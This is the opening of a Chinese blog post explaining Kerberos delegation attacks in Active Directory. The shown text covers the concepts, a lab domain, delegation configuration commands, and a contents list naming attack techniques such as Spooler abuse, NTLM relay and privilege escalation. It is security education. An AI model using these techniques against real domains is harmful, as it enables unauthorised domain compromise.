<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
    <meta charset="UTF-8" />

    <meta name="generator" content="Hugo 0.94.0" /><meta name="theme-color" content="#fff" />
    <meta name="color-scheme" content="light dark">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
    
    <meta http-equiv="Cache-Control" content="no-transform" />
    
    <meta http-equiv="Cache-Control" content="no-siteapp" />

    <title>Kerberos 域委派攻击 | zjun&#39;s blog</title>

    <link rel="stylesheet" href="/css/meme.min.css" />

    
    
        <script src="/js/meme.min.js"></script>

    

    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>

    <meta name="author" content="zjun" /><meta name="description" content="在 Windows 2000 Server 首次发布 Active Directory 时，Microsoft 必须提供一种简单的机制来支持用户通过 Kerberos 向 Web Server 进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为……" />

    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#fff" />
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-title" content="zjun&#39;s blog" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="application-name" content="zjun&#39;s blog" />
    <meta name="msapplication-starturl" content="../../" />
    <meta name="msapplication-TileColor" content="#fff" />
    <meta name="msapplication-TileImage" content="../../icons/mstile-150x150.png" />
    <link rel="manifest" href="/manifest.json" />

    
    

    
    <link rel="canonical" href="https://blog.zjun.info/2022/kerberos-domain-delegation-attack.html" />
    

<script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "BlogPosting",
        "datePublished": "2022-02-22T21:17:23+08:00",
        "dateModified": "2022-03-11T12:39:16+08:00",
        "url": "https://blog.zjun.info/2022/kerberos-domain-delegation-attack.html",
        "headline": "Kerberos 域委派攻击",
        "description": "在 Windows 2000 Server 首次发布 Active Directory 时，Microsoft 必须提供一种简单的机制来支持用户通过 Kerberos 向 Web Server 进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为……",
        "inLanguage" : "zh-CN",
        "articleSection": "posts",
        "wordCount":  7756 ,
        "image": ["https://oss.zjun.info/zjun.info/202202121835778.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202141214020.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202141236066.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202141318082.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202141322167.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202141506468.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202141506972.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202151718682.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202151739592.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202151742777.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202151747499.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202151749581.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202161317998.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202161332753.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202161335453.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202161351112.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202161359682.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202162030918.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202161538248.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202201422243.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202161543696.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202201422517.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202201422985.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202162006580.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202162032172.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202201426656.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202201421194.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202162118805.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202212110323.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202212111407.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202212113943.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202212114783.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202212115620.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202212147670.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202221843237.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202212316648.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202221846076.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202221846124.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202221859772.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202221859364.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202221956554.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202222019508.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202222025067.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202222034055.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202222048997.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202202222051843.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA"],
        "publisher": {
            "@type": "Organization",
            "name": "zjun's blog",
            "logo": {
                "@type": "ImageObject",
                "url": "https://blog.zjun.info/icons/apple-touch-icon.png"
            },
            "url": "https://blog.zjun.info/"
        },
        "mainEntityOfPage": {
            "@type": "WebSite",
            "@id": "https://blog.zjun.info/"
        }
    }
</script>

    

<meta name="twitter:card" content="summary_large_image" />


<meta name="twitter:site" content="@zjuninfo" />

    



<meta property="og:title" content="Kerberos 域委派攻击" />
<meta property="og:description" content="在 Windows 2000 Server 首次发布 Active Directory 时，Microsoft 必须提供一种简单的机制来支持用户通过 Kerberos 向 Web Server 进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为……" />
<meta property="og:url" content="https://blog.zjun.info/2022/kerberos-domain-delegation-attack.html" />
<meta property="og:site_name" content="zjun&#39;s blog" />
<meta property="og:locale" content="zh" /><meta property="og:image" content="https://oss.zjun.info/zjun.info/202202121835778.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" />
<meta property="og:type" content="article" />
    <meta property="article:published_time" content="2022-02-22T21:17:23&#43;08:00" />
    <meta property="article:modified_time" content="2022-03-11T12:39:16&#43;08:00" />
    
    <meta property="article:section" content="posts" />



    
    

    
</head>

    <body>
        <div class="container">
            
    <header class="header">
        
            <div class="header-wrapper">
                <div class="header-inner single">
                    
    <div class="site-brand">
        
            <a href="/" class="brand">zjun&#39;s blog</a>
        
    </div>

                    <nav class="nav">
    <ul class="menu" id="menu">
        
            
        
        
        
        
            
                <li class="menu-item active"><a href="/posts/"><span class="menu-item-name">文章</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/categories/"><span class="menu-item-name">分类</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/links.html"><span class="menu-item-name">友链</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/about.html"><span class="menu-item-name">关于</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="https://tools.zjun.info"><span class="menu-item-name">在线工具</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="https://github.com/z1un"><span class="menu-item-name">Github</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="https://twitter.com/zjuninfo"><span class="menu-item-name">Twitter</span></a>
                </li>
            
        
            
                
                    
                    
                        <li class="menu-item">
                            <a id="theme-switcher" href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-light"><path d="M193.2 104.5l48.8-97.5a18 18 0 0128 0l48.8 97.5 103.4 -34.5a18 18 0 0119.8 19.8l-34.5 103.4l97.5 48.8a18 18 0 010 28l-97.5 48.8 34.5 103.4a18 18 0 01-19.8 19.8l-103.4-34.5-48.8 97.5a18 18 0 01-28 0l-48.8-97.5l-103.4 34.5a18 18 0 01-19.8-19.8l34.5-103.4-97.5-48.8a18 18 0 010-28l97.5-48.8-34.5-103.4a18 18 0 0119.8-19.8zM256 128a128 128 0 10.01 0M256 160a96 96 0 10.01 0"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-dark"><path d="M27 412a256 256 0 10154-407a11.5 11.5 0 00-5 20a201.5 201.5 0 01-134 374a11.5 11.5 0 00-15 13"/></svg></a>
                        </li>
                    
                
            
        
            
                
            
        
    </ul>
</nav>

                    
                </div>
            </div>
            
    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
    <label for="nav-toggle" class="nav-toggle"></label>
    <label for="nav-toggle" class="nav-curtain"></label>


        
    </header>




            
            
    <main class="main single" id="main">
    <div class="main-inner">

        

        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">

            <h1 class="post-title p-name">Kerberos 域委派攻击</h1>

            

            
                
            

            
                

<div class="post-meta">
    
        
        <time datetime="2022-02-22T21:17:23&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M148 288h-40c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3 0 6-2.7 6-6z"/></svg>&nbsp;2022.2.22</time>
    
    
    
    
        
        
        
            
                <span class="post-meta-item category"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>&nbsp;<a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-link p-category">网络安全</a></span>
            
        
    
    
    
    
    
</div>

            

            <nav class="contents">
  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
    <li><a id="contents:非约束性委派" href="#非约束性委派">非约束性委派</a>
      <ol>
        <li><a id="contents:在域控上配置非约束性委派" href="#在域控上配置非约束性委派">在域控上配置非约束性委派</a></li>
        <li><a id="contents:查询非约束性委派的计算机或服务账号" href="#查询非约束性委派的计算机或服务账号">查询非约束性委派的计算机或服务账号</a>
          <ol>
            <li><a id="contents:powerview" href="#powerview">PowerView</a></li>
            <li><a id="contents:adfind" href="#adfind">Adfind</a></li>
            <li><a id="contents:ldapsearch" href="#ldapsearch">ldapsearch</a></li>
          </ol>
        </li>
        <li><a id="contents:非约束性委派攻击" href="#非约束性委派攻击">非约束性委派攻击</a>
          <ol>
            <li><a id="contents:模拟域管访问非约束性委派主机" href="#模拟域管访问非约束性委派主机">模拟域管访问非约束性委派主机</a></li>
            <li><a id="contents:非约束性委派-spooler-打印机服务漏洞" href="#非约束性委派-spooler-打印机服务漏洞">非约束性委派 +Spooler 打印机服务漏洞</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a id="contents:约束性委派" href="#约束性委派">约束性委派</a>
      <ol>
        <li><a id="contents:在域控上配置约束性委派" href="#在域控上配置约束性委派">在域控上配置约束性委派</a>
          <ol>
            <li><a id="contents:仅使用-kerberosk" href="#仅使用-kerberosk">仅使用 Kerberos(K)</a></li>
            <li><a id="contents:使用任何身份验证协议-n" href="#使用任何身份验证协议-n">使用任何身份验证协议 (N)</a></li>
          </ol>
        </li>
        <li><a id="contents:查询约束性委派的计算机或服务账号" href="#查询约束性委派的计算机或服务账号">查询约束性委派的计算机或服务账号</a>
          <ol>
            <li><a id="contents:powerview-1" href="#powerview-1">PowerView</a></li>
            <li><a id="contents:adfind-1" href="#adfind-1">Adfind</a></li>
            <li><a id="contents:ldapsearch-1" href="#ldapsearch-1">ldapsearch</a></li>
          </ol>
        </li>
        <li><a id="contents:约束性委派攻击" href="#约束性委派攻击">约束性委派攻击</a></li>
      </ol>
    </li>
    <li><a id="contents:基于资源的约束性委派" href="#基于资源的约束性委派">基于资源的约束性委派</a>
      <ol>
        <li><a id="contents:约束性委派与基于资源的约束性委派配置差别" href="#约束性委派与基于资源的约束性委派配置差别">约束性委派与基于资源的约束性委派配置差别</a></li>
        <li><a id="contents:基于资源的约束性委派攻击" href="#基于资源的约束性委派攻击">基于资源的约束性委派攻击</a>
          <ol>
            <li><a id="contents:基于资源的约束性委派攻击的两个条件" href="#基于资源的约束性委派攻击的两个条件">基于资源的约束性委派攻击的两个条件</a></li>
            <li><a id="contents:基于资源的约束性委派结合-ntlm-relay-接管域控-cve-2019-1040" href="#基于资源的约束性委派结合-ntlm-relay-接管域控-cve-2019-1040">基于资源的约束性委派结合 NTLM Relay 接管域控 (CVE-2019-1040)</a></li>
            <li><a id="contents:基于资源的约束性委派进行本地提权" href="#基于资源的约束性委派进行本地提权">基于资源的约束性委派进行本地提权</a>
              <ol>
                <li><a id="contents:场景一" href="#场景一">场景一</a></li>
                <li><a id="contents:场景二" href="#场景二">场景二</a></li>
              </ol>
            </li>
            <li><a id="contents:利用基于资源的约束性委派打造变种黄金票据" href="#利用基于资源的约束性委派打造变种黄金票据">利用基于资源的约束性委派打造变种黄金票据</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a id="contents:域委派攻击的防范措施" href="#域委派攻击的防范措施">域委派攻击的防范措施</a></li>
    <li><a id="contents:参考" href="#参考">参考</a></li>
  </ol>
</nav><div class="post-body e-content">
                <p>在 Windows 2000 Server 首次发布 Active Directory 时，Microsoft 必须提供一种简单的机制来支持用户通过 Kerberos 向 Web Server 进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为“Kerberos 双跳问题”，并且要求进行委派，以便 Web Server 在修改数据库记录时模拟用户。Windows 2000 Server 发布的也是最初的非约束性委派。需要注意的一点是接受委派的用户只能是 <code>服务账户</code> 或者 <code>计算机用户</code> 。委派是域中的一种属性设置，是一个安全敏感的操作。是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限访问域内的其他服务。</p>
<p><img src="https://oss.zjun.info/zjun.info/202202121835778.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220212183512443"></p>
<p>如图，域用户 <code>zjun/user</code> 通过访问 Web 服务请求下载后台文件服务器中的文件，于是 Web 服务的服务账号 <code>webservice</code> 以域用户 <code>zjun/user</code> 的身份通过 Kerberos 认证协议或者其他身份认证协议的方式（其他身份认证协议可能存在于约束性委派或基于资源的约束性委派中，但域内基本上都是设置的仅使用 Kerberos 认证协议）请求后台文件服务器。这就是一个委派的流程。</p>
<p>委派主要分为以下三种：</p>
<ul>
<li>非约束性委派 <code>UD: Unconstrained Delegation</code></li>
<li>约束性委派 <code>CD: Constrained Delegation</code></li>
<li>基于资源的约束性委派 <code>RBCD: Resource Based Constrained Delegation</code></li>
</ul>
<p>以下是本地操作环境：</p>
<ul>
<li>域：<code>zjun.com</code></li>
<li>域控：
<ul>
<li>主域控：<code>P-DC</code> 系统：<code>Windows Server 2019</code> IP：<code>172.16.86.136</code></li>
<li>辅域控：<code>S-DC</code> 系统：<code>Windows Server 2016</code> IP：<code>172.16.86.135</code></li>
</ul>
</li>
<li>域内主机：
<ul>
<li><code>Win-2008</code> IP：<code>172.16.86.133</code> 本地管理员：<code>user</code></li>
<li><code>Win-2012</code> IP：<code>172.16.86.134</code> 本地管理员：<code>user</code></li>
</ul>
</li>
<li>域用户：
<ul>
<li>域管：<code>zjun\administrator</code></li>
<li>普通域用户：<code>zjun\admin</code></li>
<li>配置委派的域用户和服务账号：<code>zjun\test</code></li>
</ul>
</li>
</ul>
<h2 id="非约束性委派"><a href="#非约束性委派" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:非约束性委派" class="headings">非约束性委派</a></h2>
<p>服务账号可以获取被委派用户的 TGT，并将 TGT 缓存到 lsass 进程中，从而服务账号可使用该 TGT，模拟该用户访问域内其他服务。非约束委派的设置需要 SeEnableDelegationPrivilege 权限，该特权通常只有域管理员才有。</p>
<h3 id="在域控上配置非约束性委派"><a href="#在域控上配置非约束性委派" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:在域控上配置非约束性委派" class="headings">在域控上配置非约束性委派</a></h3>
<p><strong>计算机用户</strong>的非约束性委派配置：控制面板\系统和安全\管理工具\Active Directory 用户和计算机（%SystemRoot%\system32\dsa.msc）---&gt; 域名/Computers/名称/属性 ---&gt; 委派 ---&gt; 信任此计算机来委派任何服务 (仅 Kerberos)(T)</p>
<p><img src="https://oss.zjun.info/zjun.info/202202141214020.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220214121403951"></p>
<ul>
<li>
<p>配置了非约束性委派属性的计算机用户的<code>userAccountControl</code>属性有个 Flag 位<code>WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION</code>，其对应的数是<code>0x81000=528384</code>。</p>
<p>可在 Active Directory 用户和计算机窗口中开启查看的高级功能后选择对应机器名称属性中的属性编辑器中看到，如下图。</p>
</li>
</ul>
<p><img src="https://oss.zjun.info/zjun.info/202202141236066.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220214123601569"></p>
<p><strong>服务账号</strong>的非约束性委派配置，可以先创建一个普通用户 <code>test</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net user <span class="nb">test</span> P@ssw0rd /add /domain
</span></span></code></pre></div><p>普通用户默认没有委派的选项设置，需要给他注册一个服务主体名称（SPN）使其成为一个服务账号</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">setspn -U -A priv/test <span class="nb">test</span>
</span></span></code></pre></div><p>也可以查找指定 <code>test</code> 用户注册的 SPN</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">setspn -L <span class="nb">test</span>
</span></span></code></pre></div><p>这时候 <code>test</code> 用户就拥有委派的属性，可以将其设置为非约束性委派</p>
<p><img src="https://oss.zjun.info/zjun.info/202202141318082.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220214131758031"></p>
<ul>
<li>
<p>配置了非约束性委派属性的服务账号的<code>userAccountControl</code>属性有个 Flag 位<code>NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION</code>， 其对应的数是<code>0x80200=524800</code>。</p>
<p>可在 Active Directory 用户和计算机窗口中开启查看的高级功能后选择对应服务账户名称属性中的属性编辑器中看到，如下图</p>
</li>
</ul>
<p><img src="https://oss.zjun.info/zjun.info/202202141322167.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220214132209967"></p>
<h3 id="查询非约束性委派的计算机或服务账号"><a href="#查询非约束性委派的计算机或服务账号" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:查询非约束性委派的计算机或服务账号" class="headings">查询非约束性委派的计算机或服务账号</a></h3>
